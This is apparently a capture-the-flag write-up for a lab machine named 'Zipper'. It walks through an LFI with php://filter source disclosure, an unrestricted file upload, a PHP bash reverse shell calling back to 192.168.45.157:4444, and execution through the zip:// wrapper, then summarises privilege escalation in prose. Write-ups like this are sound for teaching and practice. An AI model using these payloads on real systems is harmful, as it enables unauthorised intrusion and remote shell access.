# Zipper - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed several open services:
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH (Unknown version)
25/tcp  open  smtp     Postfix SMTP service
80/tcp  open  http     Apache httpd
443/tcp open  https    Apache httpd (SSL/TLS)
```

### System Information
Target information gathered from post-exploitation:
```
Linux zipper 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

### Web Enumeration
The website appeared to be a custom ZIP archiving utility that allowed users to upload multiple files and compress them into a ZIP archive. Directory scanning with feroxbuster and wfuzz revealed standard web directories.

## Gaining Initial Access

### LFI Discovery
During web enumeration, I discovered a potential Local File Inclusion (LFI) vulnerability in the application:
```
http://192.168.162.229/index.php?file=
```

Testing the parameter revealed several important characteristics:
- Regular LFI attempts did not return any content
- Including "index" caused a 500 error, indicating an include operation was occurring
- The URL `http://192.168.162.229/index.php?file=home` returned the home.php page
- This suggested that the `.php` extension was being automatically appended to the file parameter

### Source Code Analysis
Using PHP filter techniques, I was able to extract the source code of key application files:
```
http://192.168.162.229/index.php?file=php://filter/convert.base64-encode/resource=upload
```

After decoding the base64 output, I discovered interesting functionality in `upload.php`:

```php
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}
```

Key observations from the code:
1. No file extension validation was being performed
2. Files were being uploaded to the `/uploads` directory
3. Each upload was also being compressed into a timestamped ZIP file

### PHP Reverse Shell Upload
Since there were no restrictions on file extensions, I created a PHP reverse shell (`shell.php`) with the following content:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.157/4444 0>&1'");
?>
```

I uploaded this file through the web interface which:
1. Stored the PHP file in the `/uploads` directory
2. Added the file to a ZIP archive (e.g., `upload_1733933598.zip`)

### Shell Execution via ZIP Wrapper
To execute the PHP code, I leveraged PHP's ZIP wrapper functionality along with the LFI vulnerability:
```
http://192.168.162.229/index.php?file=zip:///var/www/html/uploads/upload_1733933598.zip%23shell
```

The URL breaks down as follows:
- `zip://` - PHP's ZIP wrapper protocol
- `/var/www/html/uploads/upload_1733933598.zip` - Path to the uploaded ZIP file
- `%23shell` - URL-encoded `#` followed by the filename inside the ZIP (without extension)

With a netcat listener ready on port 4444, this request executed my reverse shell and provided initial access as the `www-data` user.

## Privilege Escalation

### Lateral Movement to marcot
After gaining initial access as `www-data`, I ran enumeration scripts including linpeas and linenum to identify potential privilege escalation vectors.

I discovered a git repository with SSH keys belonging to user `marcot`. Although the SSH key didn't work directly with any of the users, I was able to leverage information found in the repository to gain access as `marcot` through password spraying.

### Lateral Movement to matthewa
From the `marcot` user, I continued enumeration and discovered credentials that allowed me to switch to the `matthewa` user.

### Root Access
Using the process monitoring tool `pspy`, I observed a process revealing what appeared to be the root password. With this password, I was able to gain root access with `su root` and successfully complete the challenge.

